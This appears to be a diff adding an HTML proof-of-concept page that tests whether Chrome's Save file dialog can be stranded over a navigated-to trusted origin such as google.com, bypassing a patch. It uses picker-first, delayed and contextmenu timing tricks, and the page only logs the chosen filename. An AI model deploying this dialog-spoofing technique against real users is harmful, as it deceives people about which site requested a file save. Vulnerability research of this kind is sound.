@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>showSaveFilePicker — bypass sweep (desktop Chrome)</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: system-ui, sans-serif; max-width: 640px; margin: 0 auto; padding: 1.2rem; line-height: 1.5; }
+    h1 { font-size: 1.25rem; }
+    p { font-size: .92rem; }
+    fieldset { margin: 1rem 0; border: 1px solid #ccc; border-radius: 8px; padding: .6rem 1rem; }
+    legend { font-weight: 600; font-size: .85rem; }
+    label { display: block; padding: .4rem .3rem; font-size: 1rem; }
+    input[type=radio] { margin-right: .5rem; }
+    .row { margin: .7rem 0; }
+    .row input { width: 100%; padding: .6rem; font-size: 1rem; border: 1px solid #bbb; border-radius: 8px; }
+    .row2 { display: flex; gap: .7rem; }
+    .row2 > div { flex: 1; }
+    button { display: block; width: 100%; margin: .7rem 0; padding: .9rem; font-size: 1.05rem; font-weight: 600;
+             color: #fff; background: #2563eb; border: none; border-radius: 10px; }
+    button.prime { background: #16a34a; }
+    #log { white-space: pre-wrap; word-break: break-word; background: #111; color: #0f0; padding: 1rem;
+           border-radius: 8px; min-height: 4rem; font-family: ui-monospace, Menlo, monospace; font-size: .82rem; }
+    #support { font-size: .78rem; color: #666; }
+  </style>
+</head>
+<body>
+  <h1>showSaveFilePicker — bypass sweep</h1>
+  <p>
+    Tests whether the Save dialog can be stranded over a cross-origin page on a
+    patched Chrome. Benign: only opens the dialog and logs the chosen name —
+    it does NOT write any file. Serve over HTTPS/localhost (FSA needs a secure context).
+  </p>
+  <div id="support"></div>
+
+  <button class="prime" id="prime">Prime pop-up permission (optional test — tap Allow)</button>
+
+  <fieldset>
+    <legend>Trigger mode</legend>
+    <label><input type="radio" name="mode" value="pickerFirst" checked> Picker FIRST (open while active), then navigate — main hypothesis</label>
+    <label><input type="radio" name="mode" value="delayed"> Delayed picker (baseline — the patched pattern)</label>
+    <label><input type="radio" name="mode" value="contextmenu"> Open picker from a contextmenu gesture, then navigate</label>
+  </fieldset>
+
+  <fieldset>
+    <legend>How to surface the trusted origin</legend>
+    <label><input type="radio" name="surface" value="location" checked> Same-tab navigate (location.href)</label>
+    <label><input type="radio" name="surface" value="newtab"> New tab (window.open _blank)</label>
+    <label><input type="radio" name="surface" value="popup"> Popup (window.open)</label>
+    <label><input type="radio" name="surface" value="none"> None — I'll navigate manually</label>
+  </fieldset>
+
+  <div class="row2">
+    <div>
+      <label class="fld" for="pdelay">Picker delay (s) — delayed mode</label>
+      <input id="pdelay" type="number" min="0" step="0.5" value="3">
+    </div>
+    <div>
+      <label class="fld" for="ndelay">Navigate after (s) — picker-first</label>
+      <input id="ndelay" type="number" min="0" step="0.5" value="1">
+    </div>
+  </div>
+  <div class="row">
+    <label class="fld" for="url">Trusted URL</label>
+    <input id="url" type="url" value="https://www.google.com" autocapitalize="off" autocorrect="off">
+  </div>
+
+  <button id="go">Run test</button>
+  <div id="log">waiting…</div>
+
+  <script>
+    const logEl = document.getElementById('log');
+    const log = (m) => { logEl.textContent += '\n' + m; };
+    const mode = () => document.querySelector('input[name=mode]:checked').value;
+    const surface = () => document.querySelector('input[name=surface]:checked').value;
+    const url = () => document.getElementById('url').value;
+    const pdelay = () => Math.max(0, parseFloat(document.getElementById('pdelay').value) || 0) * 1000;
+    const ndelay = () => Math.max(0, parseFloat(document.getElementById('ndelay').value) || 0) * 1000;
+
+    document.getElementById('support').textContent =
+      'secureContext: ' + window.isSecureContext + ' | showSaveFilePicker: ' +
+      (('showSaveFilePicker' in window) ? 'yes' : 'no');
+
+    document.getElementById('prime').onclick = () => {
+      const w = window.open('about:blank', '_blank');
+      if (w) { try { w.close(); } catch (e) {} log('primed (pop-up permission).'); }
+      else log('pop-up blocked — allow it, then retry.');
+    };
+
+    function openPicker() {
+      if (!('showSaveFilePicker' in window)) { log('showSaveFilePicker unsupported / not secure context'); return; }
+      // Benign: open the Save dialog and log the chosen name. No file is written.
+      window.showSaveFilePicker({ suggestedName: 'document.pdf' })
+        .then(h => log('picker returned handle: ' + (h && h.name) + ' (no write performed)'))
+        .catch(e => log('picker: ' + e.name));
+    }
+
+    function doSurface() {
+      const s = surface(), u = url();
+      if (s === 'location') window.location.href = u;
+      else if (s === 'newtab') window.open(u, '_blank');
+      else if (s === 'popup') window.open(u);
+      else log('navigate manually now to observe the overlay.');
+    }
+
+    function run() {
+      const m = mode();
+      logEl.textContent = 'run: ' + m + ' / ' + surface();
+      if (m === 'pickerFirst') {
+        openPicker();                                  // dialog opens while page is active
+        log('picker opened; surfacing trusted origin in ' + (ndelay()/1000) + 's');
+        setTimeout(doSurface, ndelay());               // navigate behind the open dialog
+      } else if (m === 'delayed') {
+        log('waiting ' + (pdelay()/1000) + 's, then opening picker (navigate away meanwhile)');
+        if (surface() !== 'none') setTimeout(doSurface, 200);
+        setTimeout(openPicker, pdelay());
+      }
+    }
+
+    document.getElementById('go').onclick = () => {
+      if (mode() === 'contextmenu') {
+        log('right-click / long-press anywhere to fire the picker via contextmenu, then it navigates.');
+        return;
+      }
+      run();
+    };
+
+    // contextmenu-gesture path (known activation-preservation vector).
+    document.addEventListener('contextmenu', (e) => {
+      if (mode() !== 'contextmenu') return;
+      e.preventDefault();
+      logEl.textContent = 'run: contextmenu / ' + surface();
+      openPicker();
+      setTimeout(doSurface, ndelay());
+    });
+  </script>
+</body>
+</html>
